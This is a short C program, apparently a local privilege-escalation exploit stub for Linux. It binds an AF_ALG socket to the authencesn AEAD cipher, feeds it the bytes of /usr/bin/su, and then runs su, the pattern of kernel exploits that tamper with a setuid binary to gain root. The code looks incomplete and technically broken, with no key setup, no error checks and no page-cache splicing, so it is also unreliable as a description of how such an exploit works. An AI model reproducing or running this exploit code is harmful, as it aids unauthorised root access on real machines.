#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <linux/if_alg.h>
#include <string.h>

int main() {
    int sock = socket(AF_ALG, SOCK_SEQPACKET, 0);

    struct sockaddr_alg sa = {
        .salg_family = AF_ALG,
        .salg_type = "aead",
        .salg_name = "authencesn(hmac(sha256),cbc(aes))"
    };

    bind(sock, (struct sockaddr *)&sa, sizeof(sa));

    int opfd = accept(sock, NULL, 0);

    int fd = open("/usr/bin/su", O_RDONLY);

    char buf[4096];
    read(fd, buf, sizeof(buf));

    write(opfd, buf, sizeof(buf));

    system("su");

    return 0;
}